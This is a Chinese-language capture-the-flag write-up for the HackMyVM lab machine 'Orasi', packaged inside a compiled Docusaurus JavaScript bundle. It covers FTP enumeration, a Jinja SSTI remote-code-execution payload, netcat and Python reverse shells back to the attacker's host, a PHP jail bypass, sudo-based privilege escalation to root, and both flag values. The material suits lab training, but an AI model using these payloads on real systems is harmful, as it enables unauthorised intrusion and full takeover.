"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[648],{63552:(e,n,r)=>{r.r(n),r.d(n,{assets:()=>l,contentTitle:()=>t,default:()=>p,frontMatter:()=>a,metadata:()=>o,toc:()=>c});var i=r(85893),s=r(11151);const a={},t="Orasi",o={id:"HackMyVM/Machines/Orasi/index",title:"Orasi",description:"[Linux VM] [Tested on VirtualBox] created by || alienum",source:"@site/docs/HackMyVM/Machines/Orasi/index.md",sourceDirName:"HackMyVM/Machines/Orasi",slug:"/HackMyVM/Machines/Orasi/",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Orasi/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Orasi/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackMyVM_Sidebar",previous:{title:"Nebula",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Nebula/"},next:{title:"Pickle",permalink:"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pickle/"}},l={},c=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"ftp \u533f\u540d\u767b\u9646",id:"ftp-\u533f\u540d\u767b\u9646",level:2},{value:"web \u670d\u52a1 Port-80",id:"web-\u670d\u52a1-port-80",level:2},{value:"web \u670d\u52a1 Port-5000",id:"web-\u670d\u52a1-port-5000",level:2},{value:"SSTI \u6ce8\u5165\u653b\u51fb",id:"ssti-\u6ce8\u5165\u653b\u51fb",level:3},{value:"User - www-data",id:"user---www-data",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"\u5c1d\u8bd5\u63d0\u6743",id:"\u5c1d\u8bd5\u63d0\u6743",level:3},{value:"User - kori",id:"user---kori",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-1",level:3},{value:"Android .apk \u6587\u4ef6\u9006\u5411",id:"android-apk-\u6587\u4ef6\u9006\u5411",level:2},{value:"User - irida",id:"user---irida",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-2",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function d(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",p:"p",pre:"pre",...(0,s.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"orasi",children:"Orasi"}),"\n",(0,i.jsxs)(n.admonition,{type:"note",children:[(0,i.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || alienum"}),(0,i.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2021-02-14"}),(0,i.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 4bd04ed7760026c3207e13e62b99c5a2"}),(0,i.jsx)(n.p,{children:"\u2620 Root // 29"}),(0,i.jsx)(n.p,{children:"\ud83d\udc80 User // 28"}),(0,i.jsx)(n.p,{children:"\ud83d\udcddNotes //\nCTF like VM. Hint: Just one useless little dot."})]}),"\n",(0,i.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,i.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.111\n"})}),"\n",(0,i.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"Nmap scan report for 192.168.56.111\nHost is up (0.00033s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 8a:07:93:8e:8a:d6:67:fe:d0:10:88:14:61:49:5a:66 (RSA)\n|   256 5a:cd:25:31:ec:f2:02:a8:a8:ec:32:c9:63:89:b2:e3 (ECDSA)\n|_  256 39:70:57:cc:bb:9b:65:50:36:8d:71:00:a2:ac:24:36 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.38 ((Debian))\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Apache/2.4.38 (Debian)\n5000/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.7.3)\n|_http-title: 404 Not Found\n|_http-server-header: Werkzeug/1.0.1 Python/3.7.3\n"})}),"\n",(0,i.jsx)(n.h2,{id:"ftp-\u533f\u540d\u767b\u9646",children:"ftp \u533f\u540d\u767b\u9646"}),"\n",(0,i.jsx)(n.p,{children:"\u63a2\u6d4b\u73af\u5883"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"ftp> ls -lah\n229 Entering Extended Passive Mode (|||42117|)\n150 Here comes the directory listing.\ndrwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 .\ndrwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..\ndrwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 pub\nftp> ls -lah\n229 Entering Extended Passive Mode (|||45906|)\n150 Here comes the directory listing.\ndrwxr-xr-x    2 ftp      ftp          4096 Feb 11  2021 .\ndrwxr-xr-x    3 ftp      ftp          4096 Feb 11  2021 ..\n-rw-r--r--    1 ftp      ftp         16976 Feb 07  2021 url\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6 ",(0,i.jsx)(n.code,{children:"url"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $file url\nurl: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=ef3648aae50173281b64e2d9f71511b1b4abb0a3, for GNU/Linux 3.2.0, not stripped\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u53cd\u7f16\u8bd1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-c",children:'int __fastcall main(int argc, const char **argv, const char **envp)\n{\n    init = (__int64)malloc(8uLL);\n    *(_BYTE *)init = 111;\n    *(_DWORD *)(init + 4) = -1;\n    insert(1LL, 47LL);\n    insert(2LL, 115LL);\n    insert(42LL, 104LL);\n    insert(4LL, 52LL);\n    insert(12LL, 100LL);\n    insert(14LL, 48LL);\n    insert(17LL, 119LL);\n    insert(18LL, 36LL);\n    insert(19LL, 115LL);\n    puts("Sometimes things are not obvious");\n    item = search(18LL);\n    if (item)\n    printf("Element found: %d\\n", (unsigned int)*(char *)item);\n    else\n    puts("Element not found");\n    return 0;\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u5176\u4e2d ",(0,i.jsx)(n.code,{children:"insert"})," \u90e8\u5206\u7684\u6570\u636e\u6709\u70b9\u5947\u602a\uff0c\u5199\u4e2a\u811a\u672c\u89e3\u7801\u770b\u770b"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-python",children:'data = [47, 115, 104, 52, 100, 48, 119, 36, 115]\n\nfor i in data:\n    print(chr(i),end="")\n\n# /sh4d0w$s\n'})}),"\n",(0,i.jsx)(n.h2,{id:"web-\u670d\u52a1-port-80",children:"web \u670d\u52a1 Port-80"}),"\n",(0,i.jsx)(n.p,{children:"\u76f4\u63a5\u8bf7\u6c42\uff0c\u67e5\u770b\u8fd4\u56de\u7684\u6570\u636e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-html",children:"<head>\n</head>\n    <body>\n    <h1>Orasi</h1>\n    <br>\n    <p>6 6 1337leet</p>\n</body>\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u8fd4\u56de\u7684\u6570\u636e\uff0c\u6000\u7591\u662f ",(0,i.jsx)(n.code,{children:"crunch"})," \u5de5\u5177\u7684\u53c2\u6570\uff0c\u5c1d\u8bd5\u5148\u8dd1\u4e00\u4efd\u5b57\u5178"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $crunch 6 6 1337leet > Orasi.dic\nCrunch will now generate the following amount of data: 326592 bytes\n0 MB\n0 GB\n0 TB\n0 PB\nCrunch will now generate the following number of lines: 46656\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u7206\u7834\uff0c\u672a\u53d1\u73b0\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,i.jsx)(n.h2,{id:"web-\u670d\u52a1-port-5000",children:"web \u670d\u52a1 Port-5000"}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u5229\u7528\u5f97\u5230\u7684\u8def\u5f84\u8fdb\u884c\u8bbf\u95ee"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.111:5000/sh4d0w$s"',children:"No input\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u770b\u770b\u4f7f\u7528\u4e0a\u9762\u8dd1\u51fa\u6765\u7684\u5b57\u5178\u8fdb\u884c\u7206\u7834"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'import requests\nfrom rich.progress import Progress\n\nurl = "http://192.168.56.111:5000/sh4d0w$s?{}={{1+1}}"\n\nwith open("./Orasi.dic", "r") as f:\n    words = f.read()\n    words = words.split("\\n")\n\nwith Progress() as progress:\n    task = progress.add_task("[cyan]Processing...", total=len(words))\n\n    for word in words:\n        progress.update(task, advance=1)\n        # print(url.format(word))\n        res = requests.get(url.format(word))\n        if res.text != "No input":\n            print(url.format(word))\n# http://192.168.56.111:5000/sh4d0w$s?l333tt={1+1}\n'})}),"\n",(0,i.jsx)(n.h3,{id:"ssti-\u6ce8\u5165\u653b\u51fb",children:"SSTI \u6ce8\u5165\u653b\u51fb"}),"\n",(0,i.jsx)(n.p,{children:"\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u5b9e\u73b0\u547d\u4ee4\u6267\u884c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"http://192.168.56.111:5000/sh4d0w$s?l333tt={{\"\".__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}}\n\nhttp://192.168.56.111:5000/sh4d0w$s?l333tt={{%22%22.__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27whoami%27).read()%22)}}\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u76f4\u63a5\u53cd\u5f39 shell"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"# http://192.168.56.111:5000/sh4d0w$s?l333tt={{%22%22.__class__.__mro__[-1].__subclasses__()[183].__init__.__globals__[%27__builtins__%27][%27eval%27](%22__import__(%27os%27).popen(%27nc%20-c%20bash%20192.168.56.102%209999%27).read()%22)}}\n\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[16:01:24] Welcome to pwncat \ud83d\udc08!\n[16:01:51] received connection from 192.168.56.111:40380\n[16:01:52] 192.168.56.111:40380: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@orasi:/var/www/html$ whoami\nwww-data\n"})}),"\n",(0,i.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,i.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for www-data on orasi:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser www-data may run the following commands on orasi:\n    (kori) NOPASSWD: /bin/php /home/kori/jail.php *\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u5c1d\u8bd5\u63d0\u6743",children:"\u5c1d\u8bd5\u63d0\u6743"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@orasi:/home/kori$ sudo -u kori /bin/php /home/kori/jail.php \"n''c -c ba''sh 192.168.56.102 8888\"\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u7531\u4e8e\u5f15\u53f7\u53ef\u4ee5\u5206\u5272\u5b57\u7b26\u4e32\u518d\u76f4\u63a5\u62fc\u63a5\uff0c\u5373\u53ef\u76f4\u63a5\u53cd\u5f39 shell"}),"\n",(0,i.jsx)(n.h2,{id:"user---kori",children:"User - kori"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 8888\n[16:14:50] Welcome to pwncat \ud83d\udc08!\n[16:15:27] received connection from 192.168.56.111:50162\n[16:15:28] 192.168.56.111:50162: registered new host w/ db\n(local) pwncat$ back\n(remote) kori@orasi:/home/kori$ whoami\nkori\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-1",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for kori on orasi:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser kori may run the following commands on orasi:\n    (irida) NOPASSWD: /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u76f4\u63a5\u5c06\u6587\u4ef6\u590d\u5236\u8fc7\u6765"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) kori@orasi:/home/kori$ touch /home/kori/irida.apk\n(remote) kori@orasi:/home/kori$ chmod 777 /home/kori/irida.apk\n(remote) kori@orasi:/home/kori$ sudo -u irida /usr/bin/cp /home/irida/irida.apk /home/kori/irida.apk\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u4e0b\u8f7d\u6587\u4ef6\u8fdb\u884c\u5206\u6790"}),"\n",(0,i.jsx)(n.h2,{id:"android-apk-\u6587\u4ef6\u9006\u5411",children:"Android .apk \u6587\u4ef6\u9006\u5411"}),"\n",(0,i.jsxs)(n.p,{children:["\u5b9a\u4f4d\u5230 ",(0,i.jsx)(n.code,{children:"com.alienum.irida.data.LoginDataSource"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-java",children:'package com.alienum.irida.data;\n\nimport com.alienum.irida.data.Result;\nimport com.alienum.irida.data.model.LoggedInUser;\nimport java.io.IOException;\nimport java.util.HashMap;\nimport java.util.UUID;\n\n/* loaded from: classes.dex */\npublic class LoginDataSource {\n    public Result<LoggedInUser> login(String username, String password) {\n        if (username.equals("irida") && password.equals(protector("1#2#3#4#5"))) {\n            try {\n                LoggedInUser user = new LoggedInUser(UUID.randomUUID().toString(), "Irida Orasis");\n                return new Result.Success(user);\n            } catch (Exception e) {\n                return new Result.Error(new IOException("Error logging in", e));\n            }\n        }\n        return new Result.Error(new IOException("Error logging in", null));\n    }\n\n    public void logout() {\n    }\n\n    public String protector(String password) {\n        String[] i = password.split("#");\n        HashMap<String, String> lexiko = new HashMap<>();\n        lexiko.put(i[0], "eye");\n        lexiko.put(i[3], "tiger");\n        lexiko.put(i[4], "()");\n        lexiko.put(i[1], "of");\n        lexiko.put(i[2], "the");\n        String buildPassword = lexiko.get(i[0]) + "." + lexiko.get(i[1]) + "." + lexiko.get(i[2]) + "." + lexiko.get(i[3]) + "." + lexiko.get(i[4]);\n        System.out.println(buildPassword);\n        return buildPassword;\n    }\n}\n'})}),"\n",(0,i.jsxs)(n.p,{children:["\u6838\u5fc3\u5728\u4e8e ",(0,i.jsx)(n.code,{children:"protector"})," \u8fd9\u4e2a\u51fd\u6570\u91cc\u9762\uff0c\u7b80\u5355\u5206\u6790\u5373\u53ef\u5f97\u5230\u5176\u8fd0\u884c\u7ed3\u679c"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"eye.of.the.tiger()\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5f97\u5230\u4e00\u7ec4\u51ed\u636e"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"irida:eye.of.the.tiger()\n"})}),"\n",(0,i.jsx)(n.h2,{id:"user---irida",children:"User - irida"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~]\n\u2514\u2500\u2500\u257c $pwncat-cs irida@192.168.56.111\n[16:30:54] Welcome to pwncat \ud83d\udc08!\nPassword: ******************\n[16:30:59] 192.168.56.111:22: normalizing shell path\n           192.168.56.111:22: registered new host w/ db\n(local) pwncat$ back\n(remote) irida@orasi:/home/irida$ whoami\nirida\n"})}),"\n",(0,i.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) irida@orasi:/home/irida$ cat user.txt\n2afb9cbb10c22dc7e154a8c434595948\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-2",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"Matching Defaults entries for irida on orasi:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser irida may run the following commands on orasi:\n    (root) NOPASSWD: /usr/bin/python3 /root/oras.py\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c1d\u8bd5\u6267\u884c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py\n: ls\nTraceback (most recent call last):\n  File \"/root/oras.py\", line 7, in <module>\n    name = bytes.fromhex(name).decode('utf-8')\nValueError: non-hexadecimal number found in fromhex() arg at position 0\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u6839\u636e\u62a5\u9519\u4fe1\u606f\uff0c\u53ef\u4ee5\u77e5\u9053\u8fd9\u662f\u4e00\u4e2a hex \u89e3\u7801\u7684\u8fc7\u7a0b\uff0c\u4f20\u5165\u4e00\u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32\u8bd5\u8bd5"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:"ls --\x3e 6C73\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:'(remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py\n: 6C73\nTraceback (most recent call last):\n  File "/root/oras.py", line 8, in <module>\n    print(exec(name))\n  File "<string>", line 1, in <module>\nNameError: name \'ls\' is not defined\n'})}),"\n",(0,i.jsx)(n.p,{children:"\u6839\u636e\u8fd9\u6b21\u7684\u62a5\u9519\u4fe1\u606f\uff0c\u5373\u53ef\u77e5\u9053\u653b\u51fb\u65b9\u5f0f"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-plaintext",children:'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.102",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\n\n--\x3e\n\n696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223139322E3136382E35362E313032222C3838383829293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B6F732E6475703228732E66696C656E6F28292C32293B696D706F7274207074793B207074792E737061776E2822626173682229\n'})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) irida@orasi:/home/irida$ sudo /usr/bin/python3 /root/oras.py\n: 696D706F727420736F636B65742C73756270726F636573732C6F733B733D736F636B65742E736F636B657428736F636B65742E41465F494E45542C736F636B65742E534F434B5F53545245414D293B732E636F6E6E6563742828223139322E3136382E35362E313032222C3838383829293B6F732E6475703228732E66696C656E6F28292C30293B206F732E6475703228732E66696C656E6F28292C31293B6F732E6475703228732E66696C656E6F28292C32293B696D706F7274207074793B207074792E737061776E2822626173682229\n"})}),"\n",(0,i.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(local) pwncat$ connect -lp 8888\n[16:38:44] received connection from 192.168.56.111:50164\n[16:38:44] 192.168.56.111:50164: loaded known host from db\n(local) pwncat$ back\n(remote) root@orasi:/home/irida# whoami\nroot\n"})}),"\n",(0,i.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-shell",children:"(remote) root@orasi:/root# cat root.txt\nb1c17c79773c831cbb9109802059c6b5\n"})})]})}function p(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}},11151:(e,n,r)=>{r.d(n,{Z:()=>o,a:()=>t});var i=r(67294);const s={},a=i.createContext(s);function t(e){const n=i.useContext(a);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:t(e.components),i.createElement(a.Provider,{value:n},e.children)}}}]);